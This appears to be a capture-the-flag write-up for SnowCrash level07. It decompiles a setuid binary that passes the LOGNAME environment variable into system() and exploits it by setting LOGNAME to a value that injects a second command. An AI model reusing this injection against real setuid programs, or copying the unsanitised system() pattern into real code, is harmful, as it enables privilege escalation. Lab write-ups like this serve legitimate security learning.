```bash
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
level07@SnowCrash:~$ 
```

Using a reverse engineering tools like `BinaryNinja`, `Angr` and `Ghidra` to get hints of want the executable do.

Using this website https://dogbolt.org we get

```c
int32_t main(int argc, char** argv, char** envp)
{
    gid_t eax = getegid();
    uid_t eax_1 = geteuid();
    setresgid(eax, eax, eax);
    setresuid(eax_1, eax_1, eax_1);
    char* var_1c = nullptr;
    asprintf(&var_1c, "/bin/echo %s ", getenv("LOGNAME"));
    return system(var_1c);
}
```

The code run a system call with the value of `var_1c` that being initialized by `asprintf` function
%s will get the value of the environment variable `LOGNAME`

```bash
LOGNAME='; getflag'
./level07
```
